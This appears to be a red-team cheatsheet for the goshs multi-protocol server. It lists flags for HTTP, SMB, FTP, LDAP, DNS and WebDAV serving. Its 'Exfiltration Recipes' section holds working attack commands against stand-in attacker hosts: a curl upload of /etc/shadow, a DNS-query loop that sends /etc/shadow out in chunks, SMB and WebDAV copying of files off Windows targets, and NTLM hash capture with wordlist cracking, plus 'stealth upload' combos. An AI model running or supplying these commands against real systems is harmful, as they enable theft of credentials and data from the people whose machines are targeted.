# goshs Cheatsheet — Quick Reference

## Quick Start

```bash
# Basic HTTP server
goshs

# SMB server on port 445
sudo goshs -smb --smb-share loot

# Authenticated upload server
goshs -p 8080 -uo -uf /tmp/exfil -b 'user:pass'

# TLS with self-signed cert
goshs -s -ss -b 'admin:secret'
```

## Core Commands

| Action | Command |
|--------|---------|
| Start HTTP server | `goshs` |
| Start on custom port | `goshs -p 8080` |
| Serve specific directory | `goshs -d /path/to/dir` |
| Upload-only mode | `goshs -uo` |
| Read-only mode | `goshs -ro` |
| Silent (no dir listing) | `goshs -si` |
| Print version | `goshs -v` |
| Print config template | `goshs -P` |
| Load config file | `goshs -C config.yaml` |

## SMB Server

| Action | Command |
|--------|---------|
| Start SMB server | `sudo goshs -smb` |
| Custom share name | `sudo goshs -smb --smb-share data` |
| Custom port | `sudo goshs -smb --smb-port 4445` |
| With domain | `sudo goshs -smb --smb-domain CORP` |
| With hash cracking | `sudo goshs -smb -smb-wordlist /usr/share/wordlists/rockyou.txt` |
| Full exfil setup | `sudo goshs -smb --smb-share loot -d /tmp/exfil -o -V` |

## FTP/SFTP Server

| Action | Command |
|--------|---------|
| Start FTP server | `goshs -ftp` |
| Custom FTP port | `goshs -ftp --ftp-port 2121` |
| Switch to SFTP | `goshs -ftp --ftp-sftp` |
| SFTP with pubkey auth | `goshs -ftp --ftp-sftp -fkf /root/.ssh/authorized_keys` |

## LDAP Server

| Action | Command |
|--------|---------|
| Start LDAP capture | `goshs -ldap` |
| Custom LDAP port | `goshs -ldap --ldap-port 1389` |
| Enable JNDI mode | `goshs -ldap --ldap-jndi` |
| With wordlist | `goshs -ldap --ldap-wordlist /usr/share/wordlists/rockyou.txt` |
| LDAPS (TLS) | `goshs -ldap -s -ss` |

## TLS Configuration

| Action | Command |
|--------|---------|
| Self-signed cert | `goshs -s -ss` |
| Custom cert | `goshs -s -sk key.pem -sc cert.pem` |
| PKCS12 bundle | `goshs -s -p12 bundle.p12` |
| Let's Encrypt | `goshs -s -sl -sle email@domain.com -sld domain.com` |

## Authentication

| Action | Command |
|--------|---------|
| Basic auth | `goshs -b 'user:pass'` |
| Empty user | `goshs -b ':pass'` |
| Bcrypt hash | `goshs -b 'user:$2a$14$hash...'` |
| Certificate auth | `goshs -ca ca.pem` |
| Hash password for ACL | `goshs -H 'password'` |

## Connection Restrictions

| Action | Command |
|--------|---------|
| IP whitelist | `goshs -ipw "10.10.10.0/24,10.10.14.5"` |
| Trusted proxies | `goshs -tpw "10.10.10.1,10.10.10.2"` |

## Collaboration Services

| Action | Command |
|--------|---------|
| DNS server | `goshs -dns --dns-port 53` |
| SMTP server | `goshs -smtp --smtp-port 2525` |
| Both | `goshs -dns -smtp` |

## Webhooks

| Action | Command |
|--------|---------|
| Enable Discord webhook | `goshs -W -Wu "URL" -Wp Discord` |
| Upload notifications | `goshs -W -Wu "URL" -We upload` |
| Slack notifications | `goshs -W -Wu "URL" -Wp Slack` |

## Exfiltration Recipes

### Pull Files via SMB (Windows to Kali)

```bash
# Kali side
sudo goshs -smb --smb-share loot -d /tmp/exfil

# Windows side
net use L: \\KALI_IP\loot
copy C:\data\*.xlsx L:\
net use L: /delete
```

### Push Files via HTTP Upload

```bash
# Kali side
goshs -p 8080 -uo -uf /tmp/exfil -b 'ops:pass'

# Linux target
curl -u "ops:pass" -F "file=@/etc/shadow" http://KALI_IP:8080/upload

# Windows PowerShell target
Invoke-WebRequest -Uri "http://KALI_IP:8080/upload" -Method POST -InFile "C:\data.zip" -Credential $cred
```

### Exfiltrate via WebDAV

```bash
# Kali side
goshs -w -wp 8001 -d /tmp/exfil -uo

# Windows side
net use W: http://KALI_IP:8001
copy C:\data\secret.docx W:\
net use W: /delete
```

### Capture NTLM Hashes

```bash
goshs -ldap --ldap-port 389 -ldap-wordlist /usr/share/wordlists/rockyou.txt -o -V
```

### DNS Exfiltration

```bash
# Kali side
goshs -dns --dns-port 53 --dns-ip 10.10.14.5

# Target side (exfiltrate file via DNS queries)
xxd -p /etc/shadow | tr -d '\n' | fold -w 60 | while read chunk; do
    nslookup "${chunk}.exfil.local" 10.10.14.5
    sleep 0.5
done
```

### Multi-Protocol Exfil Server

```bash
goshs \
  -p 8080 -uo -uf /tmp/staging \
  -smb --smb-share loot \
  -ftp --ftp-port 2121 \
  -w -wp 8001 \
  -o -V
```

## Useful Combos

| Scenario | Command |
|----------|---------|
| Full exfil server | `goshs -smb -ftp -w -p 8080 -d /tmp/exfil -o` |
| Stealth upload | `goshs -uo -I -b 'u:p' -s -ss -p 443` |
| NTLM capture + cracking | `goshs -ldap -smb -smb-wordlist rockyou.txt` |
| WebDAV exfil with auth | `goshs -w -b 'user:pass' -s -ss -uo` |
| Red team with webhooks | `goshs -smb -W -Wu URL -Wp Discord` |

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Port 445 in use | `sudo lsof -i :445 && sudo kill <PID>` |
| Permission denied on 445 | `sudo goshs -smb` or use `--smb-port 4445` |
| SMB client can't connect | Check firewall: `sudo iptables -L -n \| grep 445` |
| LDAP not capturing hashes | Try `--ldap-port 1389` (port 389 needs root) |
| TLS cert errors | Use `-s -ss` for self-signed or generate with openssl |
| WebDAV won't connect | Ensure client has WebDAV service running |
| No output in logs | Add `-o -V` flags for output and verbose logging |

## Output Formats

```bash
# Log to file
goshs -o

# Verbose output
goshs -V

# Both
goshs -o -V
```

## Config File

```bash
# Generate template
goshs -P > config.yaml

# Edit and use
goshs -C config.yaml
```

## Quick Reference Card

```
goshs v2.1.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
WEB:     -p PORT  -d DIR  -uo/-ro
SMB:     -smb --smb-share NAME --smb-port PORT
FTP:     -ftp --ftp-port PORT --ftp-sftp
LDAP:    -ldap --ldap-port PORT --ldap-jndi
TLS:     -s -ss  |  -s -sk KEY -sc CERT
AUTH:    -b 'user:pass'  |  -ca CERT
LOGGING: -o -V
CONFIG:  -C PATH  |  -P > template.yaml
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
